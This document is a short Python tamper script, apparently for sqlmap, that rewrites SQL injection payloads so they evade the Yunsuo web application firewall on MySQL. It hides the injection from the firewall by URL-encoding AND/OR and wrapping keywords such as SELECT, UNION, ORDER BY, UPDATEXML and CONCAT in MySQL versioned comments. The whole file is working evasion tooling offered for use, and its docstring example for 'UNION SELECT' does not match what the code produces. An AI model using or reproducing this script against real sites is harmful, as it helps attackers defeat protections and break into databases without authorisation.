#!/usr/bin/env python
"""
bypass yunsuo windows_win_3.1.18.12 
by C1O2A3 
"""
import re
import os

from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
__priority__ = PRIORITY.LOWEST

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))
    pass


# def tamper(payload, **kwargs):
#     return payload.replace("'", "\\'").replace('"', '\\"')
def tamper(payload, **kwargs):
    """
    bypass yunsuo windows_win_3.1.18.12 
     Requirement:
        * MySQL 
    Tested against:
        * MySQL 5.0.51a 
    >>> tamper("1 AND '1'='1")
    "1 %26%26 '1'='1"
    >>> tamper("UNION SELECT")
    "union/*!60000ghtwf01*/select"
    ...
    """

    if payload:
        payload = re.sub(r"(?i)\bAND\b", "%26%26", re.sub(r"(?i)\bOR\b", "%7C%7C", payload))
        payload = payload.replace("SELECT","/*!00000select*/")
        payload = payload.replace("ORDER BY", "order/*!60000ghtwf01*/by")
        payload = payload.replace("DATABASE()", "database/**/()")
        payload = payload.replace("CASE WHEN", "CASE/*!60000ghtwf01*/WHEN")
        payload = payload.replace("UNION ALL", "union/*!60000ghtwf01*/")
        payload = payload.replace("EXTRACTVALUE", "/*!00000EXTRACTVALUE*/")
        payload = payload.replace("UPDATEXML", "/*!00000UPDATEXML*/")
        payload = payload.replace("VERSION()", "VERSION/*!00000()*/")
        payload = payload.replace("CONCAT", "/*!00000CONCAT*/")
        payload = payload.replace("AURORA_/*!00000VERSION()*/", "/*!00000AURORA_VERSION()*/")
        payload = payload.replace("UNION /*!00000select*/", "UNION/*!60000ghtwf01*//*!00000select*/")
        
        return payload